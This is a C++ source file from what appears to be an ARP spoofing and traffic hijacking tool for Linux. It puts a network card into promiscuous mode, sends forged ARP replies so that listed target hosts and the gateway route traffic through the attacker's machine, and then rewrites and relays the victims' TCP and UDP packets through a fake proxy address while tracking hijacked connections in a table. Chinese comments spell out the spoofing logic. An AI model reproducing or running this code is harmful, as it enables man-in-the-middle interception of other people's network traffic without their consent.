

#ifdef __cplusplus
#endif

#include "PacketProcess.h"
extern "C"{
#include <unordered_map>
#include <map>
}

#include "ArpSniffer.h"
#include "start.h"
#include "ArpCheat.h"




#define MAX_ETHERNET_PACKET	MTU + sizeof(MACHEADER)


//extern unordered_map <string , CLIENTADDRESSES> mapHijack;
//extern unordered_map <string, CLIENTADDRESSES>::iterator mapHijackIt;
unordered_map <string , CLIENTADDRESSES> mapHijack;
unordered_map <string, CLIENTADDRESSES>::iterator mapHijackIt;

string mapKeyFormat = "%x_%x_%x_%x";










LPCLIENTADDRESSES PacketProcess::getClientIP(unsigned int serverip,unsigned short serverport,unsigned short clientport) {
	int cnt = gAttackTarget.size();
	for (int i = 0; i < cnt; i++)
	{
		if (gAttackTarget[i].clientIP == 0)
		{
			continue;
		}

		char szkey[256];
		sprintf(szkey, mapKeyFormat.c_str(), serverip, serverport, gAttackTarget[i].clientIP, clientport);
		mapHijackIt = mapHijack.find(szkey);
		if (mapHijackIt != mapHijack.end())
		{
			return &mapHijackIt->second;
		}
	}

	return 0;
}


WORD PacketProcess::CalcChecksum(WORD *buffer, int size)
{
	unsigned long cksum = 0;
	while (1 < size)
	{
		cksum += *buffer++;
		size -= sizeof(USHORT);
	}
	if (0 < size)
		cksum += *(UCHAR*)buffer;
	cksum = (cksum >> 16) + (cksum & 0xffff);
	cksum += (cksum >> 16);
	return (unsigned short)(~cksum);
}




USHORT PacketProcess::GetSubPacketCheckSum(unsigned char * lpCheckSumData, unsigned int checkSumSize, DWORD dwSrcIP, DWORD dwDstIP, unsigned int protocol)
{
	char szCheckSumBuf[PACKET_RECV_BUF_SIZE];
	LPCHECKSUMFAKEHEADER lpFakeHdr = (LPCHECKSUMFAKEHEADER)szCheckSumBuf;
	lpFakeHdr->dwSrcIP = dwSrcIP;
	lpFakeHdr->dwDstIP = dwDstIP;
	lpFakeHdr->Protocol = ntohs(protocol);
	lpFakeHdr->usLen = ntohs(checkSumSize);

	memmove(szCheckSumBuf + sizeof(CHECKSUMFAKEHEADER), (char*)lpCheckSumData, checkSumSize);

	*(DWORD*)(szCheckSumBuf + sizeof(CHECKSUMFAKEHEADER) + checkSumSize) = 0;

	unsigned short wCheckSum = CalcChecksum((WORD*)szCheckSumBuf, checkSumSize + sizeof(CHECKSUMFAKEHEADER));
	return wCheckSum;
}




void *PacketProcess::SnifferPacket(void * param)
{
	int iRet = 0;

	int sockfd = socket(PF_PACKET, SOCK_RAW , htons(ETH_P_ALL));
	if (sockfd < 0)
	{
		printf("socket error!\n");
		return param;
	}else{
		printf("sockfd socket ok!\n");
	}

#ifdef ATTACK_ALL_ADDRESS
	pthread_t arpt;
	iRet = pthread_create(&arpt,0,ArpSniffer::getHostNext,(void*)sockfd);
#endif

	struct ifreq ifr = {0};
	strcpy(ifr.ifr_name, gNetcardName.c_str());

	iRet = ioctl(sockfd, SIOCGIFFLAGS, &ifr);
	if (iRet<0){
		close(sockfd);
		printf("ioctl SIOCGIFFLAGS error!\n");
	    return param;
	}else{
		printf("ioctl SIOCGIFFLAGS ok!\n");
	}

	ifr.ifr_flags |= IFF_PROMISC;
	if ((iRet = ioctl(sockfd, SIOCSIFFLAGS, &ifr)) < 0){
		printf("ioctl SIOCSIFFLAGS error!\n");
		close(sockfd);
		return param;
	}else{
		printf("ioctl SIOCSIFFLAGS ok!\n");
	}


//	int on = 1;
//	iRet = setsockopt(sockfd,IPPROTO_RAW,IP_OPTIONS,(char*)&on,4);
//	if(iRet ){
//		printf("setsockopt error:%s\r\n",strerror(errno));
//	}

	struct sockaddr_ll sa = {0};
	sa.sll_family 		= PF_PACKET;
	sa.sll_protocol 	= ETH_P_ALL;
	sa.sll_hatype 		= ARPHRD_ETHER;
	sa.sll_pkttype 		= PACKET_OTHERHOST;			//PACK_OUTGOING	PACKET_HOST
	sa.sll_halen 		= htons(MAC_ADDRESS_SIZE);
	sa.sll_ifindex 		= gCardIdx;

	try{
		char lpPacket[PACKET_RECV_BUF_SIZE];
		const LPMACHEADER lpMac = (LPMACHEADER)lpPacket;
		LPARPHEADER		ARPheader = (LPARPHEADER)(lpPacket + sizeof(MACHEADER));
		const LPIPHEADER lpIPHdr = (LPIPHEADER)((const char*)lpMac + sizeof(MACHEADER) );
		const int leastsize = sizeof(MACHEADER) + sizeof(ARPHEADER) ;
		LPTCPHEADER					lpTcp;
		LPUDPHEADER					lpUdp;
		unsigned short				srcPort;
		unsigned short				dstPort;
		unsigned short *			lpCheckSum;

		while (TRUE)
		{
			socklen_t sockaddrlen = sizeof(sockaddr_ll);
			int iCapLen = recvfrom(sockfd, lpPacket, PACKET_RECV_BUF_SIZE, 0,(sockaddr*)&sa,&sockaddrlen);
			if (iCapLen <= 0)
			{
				printf("DnsSnifferLinux recv error!\n");
				continue;
			}else if(iCapLen < leastsize){
				//continue;
			}else if(iCapLen > MAX_ETHERNET_PACKET){
				printf("message size:%u error\r\n",iCapLen);
			}

			*(lpPacket + iCapLen) = 0;


			if (lpMac->Protocol == 0x0608) {
				ARPheader = (LPARPHEADER)((char*)lpMac + sizeof(MACHEADER));
				if (ARPheader->HardWareType == 0x0100 && ARPheader->ProtocolType == 0x0008 && ARPheader->HardWareSize == MAC_ADDRESS_SIZE &&
					ARPheader->ProtocolSize == sizeof(unsigned int)  ) {

					unsigned int senderip = *(unsigned int *)ARPheader->SenderIP;
					unsigned int recverip = *(unsigned int *)ARPheader->RecverIP;

					if (ARPheader->Opcode == 0x0100)
					{
						//其他主机查询自己的虚拟ip和mac，给查询者返回虚拟网卡地址
						if ((memcmp(lpMac->DstMAC, gLocalMAC, MAC_ADDRESS_SIZE) == 0 || memcmp(lpMac->DstMAC, BROADCAST_MAC_ADDRESS, MAC_ADDRESS_SIZE) == 0) &&
							/*(memcmp(ARPheader->RecverMac, gLocalMAC, MAC_ADDRESS_SIZE) == 0) &&*/ recverip == gFakeProxyIP )
						{
							if (senderip && memcmp(ARPheader->SenderMac,ZERO_MAC_ADDRESS,MAC_ADDRESS_SIZE) != 0 )
							{
								iRet = ArpCheat::makeFakeClient(sockfd, gCardIdx,senderip, ARPheader->SenderMac);
							}
						}
						//任何一台主机查询网关，如果再攻击列表中,给被查询者更新本地mac和ip
						//分两种，广播和非广播，非广播的目的mac是自己
						else if ((memcmp(lpMac->DstMAC, BROADCAST_MAC_ADDRESS, MAC_ADDRESS_SIZE) == 0 || memcmp(lpMac->DstMAC, gLocalMAC, MAC_ADDRESS_SIZE) == 0) &&
							(recverip == gGatewayIP) && (memcmp(ARPheader->RecverMac, ZERO_MAC_ADDRESS, MAC_ADDRESS_SIZE) == 0))
						{
							unsigned char * sendermac = ClientAddress::isTarget(senderip);
							if (sendermac)
							{
								iRet = ArpCheat::arpReply(sockfd,gCardIdx, gGatewayIP, gLocalMAC,senderip, ARPheader->SenderMac);
							}
						}
						//任何主机查询自己，返回自己的正确网络地址
						else if ((memcmp(lpMac->DstMAC, BROADCAST_MAC_ADDRESS, MAC_ADDRESS_SIZE) == 0 || memcmp(lpMac->DstMAC, gLocalMAC, MAC_ADDRESS_SIZE) == 0) &&
							(recverip == gLocalIP) && (memcmp(ARPheader->RecverMac, ZERO_MAC_ADDRESS, MAC_ADDRESS_SIZE) == 0))
						{
							iRet = ArpCheat::arpReply(sockfd,gCardIdx, gLocalIP, gLocalMAC, senderip, ARPheader->SenderMac);
						}
						//网关查询所有主机的回复
						else if ( (memcmp(lpMac->DstMAC, BROADCAST_MAC_ADDRESS, MAC_ADDRESS_SIZE) == 0) &&
							(memcmp(lpMac->SrcMAC, gGatewayMAC, MAC_ADDRESS_SIZE) == 0) &&
							(memcmp(ARPheader->SenderMac, gGatewayMAC, MAC_ADDRESS_SIZE) == 0) &&
							(senderip == gGatewayIP) && (memcmp(ARPheader->RecverMac, ZERO_MAC_ADDRESS, MAC_ADDRESS_SIZE) == 0) )
						{
							if (recverip == gLocalIP)
							{
								iRet = ArpCheat::arpReply(sockfd,gCardIdx, gLocalIP, gLocalMAC, senderip, ARPheader->SenderMac);
							}
							else {
								unsigned char * dstmac = ClientAddress::isTarget(recverip);
								if (dstmac) {
									iRet = ArpCheat::arpReply(sockfd,gCardIdx, recverip, gLocalMAC, senderip, ARPheader->SenderMac);
								}
							}
						}


					}
					else if (ARPheader->Opcode == 0x0200)
					{
						//网关广播自己得地址，对每个被攻击者发送本地地址
						if ((memcmp(lpMac->DstMAC, BROADCAST_MAC_ADDRESS, MAC_ADDRESS_SIZE) == 0) &&
							(memcmp(lpMac->SrcMAC, gGatewayMAC, MAC_ADDRESS_SIZE) == 0) &&
							(gGatewayIP == senderip) &&
							memcmp(ARPheader->SenderMac, gGatewayMAC, MAC_ADDRESS_SIZE) == 0) {
								iRet = ArpCheat::sendRarps(sockfd,gCardIdx);
						}
						else {
							//iRet = Config::addTarget(gOnlineObjects, recverip, ARPheader->RecverMac);
						}
					}
				}
				continue;
			}

			if (lpMac->Protocol != 0x0008 || lpIPHdr->Version != 4)
			{
				continue;
			}

			int iIpHdrLen = (lpIPHdr->HeaderSize << 2);

			if (lpIPHdr->Protocol == IPPROTO_TCP)
			{
				lpTcp = (LPTCPHEADER)((char*)lpIPHdr + iIpHdrLen);
				//lpSrcPort = &(lpTcp->SrcPort);
				srcPort = lpTcp->SrcPort;
				//lpDstPort = &(lpTcp->DstPort);
				dstPort = lpTcp->DstPort;
				lpCheckSum = &lpTcp->PacketChksum;
				//int tcphdrlen = (lpTcp->HeaderSize << 2);
			}
			else if (lpIPHdr->Protocol == IPPROTO_UDP)
			{
				lpUdp = (LPUDPHEADER)((char*)lpIPHdr + iIpHdrLen);
				//lpSrcPort = &(lpUdp->SrcPort);
				srcPort = lpUdp->SrcPort;
				//lpDstPort = &(lpUdp->DstPort);
				dstPort = lpUdp->DstPort;
				lpCheckSum = &lpUdp->PacketChksum;
			}
			else
			{
				continue;
			}

			unsigned char * lpCheckSumData = (unsigned char*)((char*)lpIPHdr+ iIpHdrLen);
			unsigned int checkSumLen = iCapLen - sizeof(MACHEADER) - iIpHdrLen;
			unsigned int subProtocol = lpIPHdr->Protocol;

			if (memcmp(lpMac->DstMAC, gLocalMAC, MAC_ADDRESS_SIZE) == 0 && memcmp(lpMac->SrcMAC, gGatewayMAC, MAC_ADDRESS_SIZE) == 0 &&
				//lpIPHdr->DstIP == gLocalIP
				lpIPHdr->DstIP == gFakeProxyIP
				)
			{
				LPCLIENTADDRESSES ca = getClientIP(lpIPHdr->SrcIP, srcPort, dstPort);
				if (ca == 0 )
				{
					continue;
				}

				memmove(lpMac->SrcMAC, gLocalMAC, MAC_ADDRESS_SIZE);
				memmove(lpMac->DstMAC, ca->clientMAC, MAC_ADDRESS_SIZE);
				lpIPHdr->DstIP = ca->clientIP;

				lpIPHdr->HeaderChksum = 0;
				lpIPHdr->HeaderChksum = CalcChecksum((unsigned short*)lpIPHdr, iIpHdrLen);

				*lpCheckSum = 0;
				*lpCheckSum = GetSubPacketCheckSum((unsigned char*)lpCheckSumData, checkSumLen, lpIPHdr->SrcIP, lpIPHdr->DstIP, subProtocol);

				sa.sll_family = PF_PACKET;
				sa.sll_hatype = ARPHRD_ETHER;
				sa.sll_pkttype = PACKET_OUTGOING;
				sa.sll_protocol = IPPROTO_TCP;
				sa.sll_ifindex = gCardIdx;
				sa.sll_halen = MAC_ADDRESS_SIZE;
				memmove(sa.sll_addr,lpMac->DstMAC, MAC_ADDRESS_SIZE);
				iRet = sendto(sockfd, lpPacket, iCapLen,0,(sockaddr*)&sa,sizeof(sockaddr_ll));
				if (iRet<= 0)
				{
					printf("SnifferHijack sendto error:%s\r\n",strerror(errno));
				}
				continue;
			}
			else if (memcmp(lpMac->DstMAC, gLocalMAC, MAC_ADDRESS_SIZE) == 0 && memcmp(lpMac->SrcMAC, gGatewayMAC, MAC_ADDRESS_SIZE) != 0 &&
				(lpIPHdr->SrcIP & gNetMask) == gNetMaskIP && lpIPHdr->SrcIP != gGatewayIP && lpIPHdr->SrcIP != gLocalIP)
			{
				char szkey[256];
				sprintf(szkey, mapKeyFormat.c_str(), lpIPHdr->DstIP, dstPort, lpIPHdr->SrcIP, srcPort);

				//mapHijackIt = mapHijack.find(szkey);
				//if (mapHijack.end() == mapHijackIt )
				//{
					CLIENTADDRESSES ca = {0};				// = new CLIENTADDRESSES;
					ca.clientIP = lpIPHdr->SrcIP;
					ca.clientPort = srcPort;
					memmove(ca.clientMAC, lpMac->SrcMAC, MAC_ADDRESS_SIZE);
					ca.time = time(0);
					mapHijack.insert(unordered_map<string, CLIENTADDRESSES>::value_type(szkey, ca));
				//}

				memmove(lpMac->SrcMAC, gLocalMAC, MAC_ADDRESS_SIZE);
				memmove(lpMac->DstMAC, gGatewayMAC, MAC_ADDRESS_SIZE);
				//lpIPHdr->SrcIP = gLocalIP;
				lpIPHdr->SrcIP = gFakeProxyIP;
				lpIPHdr->HeaderChksum = 0;
				lpIPHdr->HeaderChksum = CalcChecksum((unsigned short*)lpIPHdr, iIpHdrLen);

				*lpCheckSum = 0;
				*lpCheckSum = GetSubPacketCheckSum((unsigned char*)lpCheckSumData, checkSumLen, lpIPHdr->SrcIP, lpIPHdr->DstIP, subProtocol);

				sa.sll_family = PF_PACKET;
				sa.sll_hatype = ARPHRD_ETHER;
				sa.sll_pkttype = PACKET_OUTGOING;
				sa.sll_protocol = IPPROTO_TCP;
				sa.sll_ifindex = gCardIdx;
				sa.sll_halen = MAC_ADDRESS_SIZE;
				memmove(sa.sll_addr,lpMac->DstMAC, MAC_ADDRESS_SIZE);
				iRet = sendto(sockfd, lpPacket, iCapLen,0,(sockaddr*)&sa,sizeof(sockaddr_ll));
				if (iRet <= 0)
				{
					printf("SnifferHijack sendto error:%s\r\n",strerror(errno));
				}
				continue;
			}
			else if (memcmp(lpMac->DstMAC, gLocalMAC, MAC_ADDRESS_SIZE) == 0 && memcmp(lpMac->SrcMAC, gLocalMAC, MAC_ADDRESS_SIZE) == 0 &&
				lpIPHdr->SrcIP == gLocalIP)
			{
				memmove(lpMac->DstMAC, gGatewayMAC, MAC_ADDRESS_SIZE);

				sa.sll_family = PF_PACKET;
				sa.sll_hatype = ARPHRD_ETHER;
				sa.sll_pkttype = PACKET_OUTGOING;
				sa.sll_protocol = IPPROTO_TCP;
				sa.sll_ifindex = gCardIdx;
				sa.sll_halen = MAC_ADDRESS_SIZE;
				memmove(sa.sll_addr,gGatewayMAC, MAC_ADDRESS_SIZE);
				iRet = sendto(sockfd, lpPacket, iCapLen,0,(sockaddr*)&sa,sizeof(sockaddr_ll));
				if (iRet <= 0)
				{
					printf("SnifferHijack sendto error:%s\r\n",strerror(errno));
				}
				continue;
			}
			else {
				continue;
			}
		}
	}catch(const std::exception& e){
		cout << e.what() << endl;
		printf("Sniffer exception:%s\r\n",e.what());
	}
	
	close(sockfd);
	return param;
}




void * PacketProcess::clearmap(void * param){

	try{
		while(1){
			time_t now = time(0);
			unordered_map <string, CLIENTADDRESSES>::iterator it;
			for(it = mapHijack.begin(); it != mapHijack.end(); ){
				if(now - it->second.time > MAP_TRAVERSAL_SECONDS){
					//delete it->second;
					mapHijack.erase(it++);
					continue;
				}else{
					it++;
				}
			}

			sleep(MAP_TRAVERSAL_SECONDS);
		}
	}catch(const std::exception& e){
		printf("clearmap exception:%s\r\n",e.what());
	}
	return param;
}
